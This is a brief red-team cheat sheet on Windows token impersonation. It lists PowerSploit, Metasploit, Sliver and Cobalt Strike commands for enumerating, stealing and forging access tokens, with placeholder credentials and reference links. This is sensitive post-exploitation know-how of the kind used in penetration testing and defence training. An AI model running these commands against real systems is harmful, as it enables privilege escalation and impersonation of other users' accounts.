# Token Impersonation

## 01 - Powersploit

TODO: Write more information related to this powersploit module

`PS C:\> Invoke-TokenManipulation -Enumerate`

`PS C:\> Invoke-TokenManipulation -ImpersonateUser -UserName "<domain_name>\<username>"`

## 02 - Metasploit

```
meterpreter > steal_token <pid>

meterpreter > getuid

meterpreter > getpid

meterpreter > drop_token
```

## 03 - Sliver

```
sliver (IMPLANT_NAME) > make-token -u <username> -d . -p <password>

sliver (IMPLANT_NAME) > execute -T -o <commands>
```

## 04 - Cobalt Strike

`beacon> make_token <domain_name>\<username> <password>`

`beacon> spawnas <domain_name>\<username> <password>`

---
## References

- [Token Stealing and Incognito](https://pentestlab.blog/2012/08/07/token-stealing-and-incognito/)

- [DMCXBlue Gitbook: Privilege Escalation Access Token Manipulation](https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation)

- [Exploit DB: Abusing Token Privileges For Local Privilege Escalation](https://www.exploit-db.com/papers/42556)

- [Helpsystems: Cobalt Strike Privilege Escalation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_privilege-escalation.htm)